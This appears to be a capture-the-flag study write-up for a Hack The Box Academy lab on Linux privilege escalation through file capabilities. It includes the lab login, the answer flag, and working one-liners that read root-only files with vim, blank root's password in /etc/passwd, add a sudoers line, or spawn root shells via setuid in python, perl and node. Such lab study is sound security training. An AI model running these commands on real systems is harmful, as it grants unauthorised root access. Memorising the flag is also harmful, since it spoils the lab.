# Section 11 — Capabilities

> Lab: `ACADEMY-LLPE-CAP` · `ssh htb-student@<T>` (`HTB_@cademy_stdnt!`)

## ✅ Answer (verified live)

| Q | Answer |
|---|--------|
| Q1 — flag via capabilities (`/root/flag.txt`) | **`HTB{c4paBili7i3s_pR1v35c}`** |

`/usr/bin/vim.basic = cap_dac_override+eip` → vim bypasses file read/write perms → read `/root/flag.txt`.

---

## Concept

Capabilities split root's power into units a *binary* can hold (independent of the user running it). `getcap` shows them; the suffix is the active set: `e`=effective, `i`=inheritable, `p`=permitted (`+ep` = usable now).

**Capabilities that → root:**
| Cap | Abuse |
|-----|-------|
| `cap_setuid` | `setuid(0)` then run anything as root |
| `cap_setgid` | become any group (incl. root/shadow) |
| `cap_dac_override` | **bypass all file r/w perms** (read `/etc/shadow`, edit `/etc/passwd`) |
| `cap_dac_read_search` | bypass read/exec perms (read any file) |
| `cap_sys_admin` | mount, broad admin → root |
| `cap_sys_ptrace` | inject into a root process |
| `cap_sys_module` | load a kernel module → root |
| `cap_chown`/`cap_fowner` | chown/perm any file → escalate |

---

## Enumerate

```bash
getcap -r / 2>/dev/null
# faster, common dirs:
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin /bin /sbin -type f -exec getcap {} \; 2>/dev/null
```
> Ignore the defaults (`ping`, `mtr-packet`, `traceroute6` = `cap_net_raw`; `gst-ptp-helper`). The exploitable ones are interpreters/editors with `cap_setuid`/`cap_dac_override`/`cap_dac_read_search`. Here: **`/usr/bin/vim.basic cap_dac_override+eip`**.

---

## Exploit per capability (GTFOBins → Capabilities)

**`cap_dac_override` on vim.basic (this box)** — vim's own file I/O ignores perms:
```bash
# read any root file (copy to a readable path):
/usr/bin/vim.basic -es -c ':e /root/flag.txt' -c ':w! /tmp/out' -c ':q!' ; cat /tmp/out
# or edit /etc/passwd to blank root's password, then become root:
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
su root          # no password prompt
# (also: append a uid-0 user, or add yourself to sudoers)
```
> `cap_dac_override` = vim can read/write **any** file. Easiest wins: copy `/root/flag.txt` out, OR strip the `x` from root in `/etc/passwd` (`root::0:0:` → passwordless `su root`), OR add `htb ALL=(ALL) NOPASSWD:ALL` to `/etc/sudoers`.

**`cap_setuid` on python/perl/etc.** — direct root:
```bash
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
/usr/bin/perl   -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash -p";'
node -e 'process.setuid(0); require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})'
```

**`cap_dac_read_search`** — read-only any file: `vim.basic -es -c ':e /etc/shadow' ...` or `tar`-based copy. **`cap_sys_admin`** → mount/overlay tricks. **`cap_sys_ptrace`** → inject shellcode into a root PID.

> Method: `getcap -r /` → take the binary+cap to **gtfobins.github.io** (Capabilities section) → run the payload. `dac_override`/`dac_read_search` = file disclosure/edit; `setuid`/`setgid` = direct shell.

---

## Exam / Engagement Notes

- **`getcap -r / 2>/dev/null` first**; filter out `cap_net_raw` defaults. Targets: editors/interpreters with `setuid`/`dac_override`/`dac_read_search`/`sys_admin`.
- `cap_dac_override` → 3 instant wins: copy the loot file, blank root in `/etc/passwd` (`su root`), or write a sudoers line.
- `cap_setuid` on python/perl/ruby/node = one-liner root shell (`os.setuid(0)`).
- Non-interactive vim: `vim.basic -es -c ':e <file>' -c ':w! /tmp/x' -c ':q!'`.
- Capabilities persist across users (set on the binary) — `+ep` = ready to abuse now.
- Report note: never `setcap` `cap_setuid`/`cap_dac_*`/`cap_sys_admin` on shells/editors/interpreters.

---

## Lab Walkthrough (quick steps)

```
1. ssh htb-student@<T>  (HTB_@cademy_stdnt!)
2. getcap -r / 2>/dev/null
   -> /usr/bin/vim.basic cap_dac_override+eip
3. /usr/bin/vim.basic -es -c ':e /root/flag.txt' -c ':w! /tmp/out' -c ':q!'
   cat /tmp/out   -> HTB{c4paBili7i3s_pR1v35c}     ✅
   (alt root: blank root pw in /etc/passwd via vim -> su root)
```

> One line: `getcap -r /`, find the editor/interp with a dangerous cap, GTFOBins it — `cap_dac_override` vim reads `/root/flag.txt` (or rewrites `/etc/passwd` for a root shell).
